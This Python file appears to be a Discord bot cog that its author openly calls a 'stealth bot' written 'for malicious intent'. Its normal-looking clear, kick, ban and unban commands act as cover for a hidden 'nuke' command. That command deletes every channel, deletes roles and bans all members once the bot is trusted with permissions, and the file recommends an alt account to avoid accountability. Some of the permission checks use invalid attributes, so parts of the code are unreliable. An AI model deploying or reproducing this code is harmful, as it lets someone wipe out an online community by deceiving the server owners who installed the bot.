# Stealth bot scripted created by K. Catterall.

# WARNING: This code is designed for malicious intent; use at your own consequences.
# NOTICE: It is reccomended that you use an alt-acount when attempting to use the following code.

import discord
from discord.ext import commands
from colorama import *

init()  # Used by colorama.


class Moderation(commands.Cog):
    def __init__(self, client):
        self.client = client


    # Clear messages (Trustworhy command = Stealth).
    @commands.command()
    async def clear(self, ctx, n=10):
        if n<1:
            await ctx.send('You must specify a real amount.')
        elif n>1000:
            await ctx.send('The limit is 1000.')
        else:
            try:
                await ctx.channel.purge(limit=n)
            except ValueError:
                await ctx.send('You must specificy a real amount.')


    # The atomic bomb (This command is malicious!).
    @commands.command(hidden=True)
    async def nuke(self, ctx):
        SKIP_BOTS = False
        await ctx.channel.purge(limit=1)

        # Delete all channels.
        print(Fore.LIGHTWHITE_EX + f"{'-'*35}" + "\nNuke depolyed!\n\n")
        print(Fore.YELLOW + "Deleting server channels:")
        for c in ctx.guild.channels:
            try:
                await c.delete()
                print(Fore.LIGHTBLUE_EX + f'Channel {c} deleted.')
            except discord.Forbidden:
                print(Fore.RED + f'Failed to delete channel {c}.') 
        print(Fore.LIGHTGREEN_EX + "Deleted all channels.\n")

        # Delete all roles.
        print(Fore.YELLOW + "Deleting server roles:")
        roles = ctx.guild.roles
        roles.pop(0)
        for role in roles:
            if ctx.guild.me.roles[-1] > role:
                try:
                    await role.delete()
                    print(Fore.LIGHTBLUE_EX + f'Role {role} deleted.')
                except discord.Forbidden:
                    print(Fore.RED + f'Failed to delete role {role}.')
            else:
                break
        print(Fore.LIGHTGREEN_EX + "Deleted all roles.\n")

        # Ban all members.
        print(Fore.YELLOW + "Banning server members:")
        for member in self.client.get_all_members():
            if member.bot and SKIP_BOTS:
                continue
            try:
                await member.ban(reason=None, delete_message_days=7)
                print(Fore.LIGHTBLUE_EX + f"Banned {member.display_name}.")
            except discord.Forbidden:
                print(Fore.RED + f'Failed to ban {member}.')
        print(Fore.LIGHTGREEN_EX + "Banned all members.\n\n")
        print(Fore.LIGHTWHITE_EX + "Nuke sucessfully exploded!" + f"\n{'-'*35}\n\n")


    # Kick a member (Trustworhy command = Stealth).
    @commands.command()
    async def kick(self, ctx, member : discord.Member, *, reason=None):
        if ctx.message.author.server.permissions.kick_members:
            await member.kick(reason=reason)
            await ctx.send(f'{member} has been kicked from the server.')
        else:
            await ctx.send('You do not have the kick members permission.')


    # Ban a member (Trustworhy command = Stealth).
    @commands.command()
    async def ban(self, ctx, member : discord.Member, *, reason=None):
        if ctx.message.author.server.permissions.ban_members:
            await member.ban(reason=reason)
            await ctx.send(f'{member} has been banned from the server.')
        else:
            await ctx.send('You do not have the ban members permission.')


    # Unban a member (Trustworhy command = Stealth).
    @commands.command()
    async def unban(self, ctx, *, member):
        if ctx.message.author.server_permissions.administrator:
            banned_users = await ctx.guild.bans()
            member_name, member_discriminator = member.split('#')

            for ban_entry in banned_users:
                user = ban_entry.user
                if (user.name, user.discriminator) == (member_name, member_discriminator):
                    await ctx.guild.unban(user)
                    await ctx.send(f'Unbanned {user.mention}')
                    return
        else:
            await ctx.send('You do not have the administator permission.')


def setup(client):
    client.add_cog(Moderation(client))


# Stealth bot scripted created by K. Catterall.
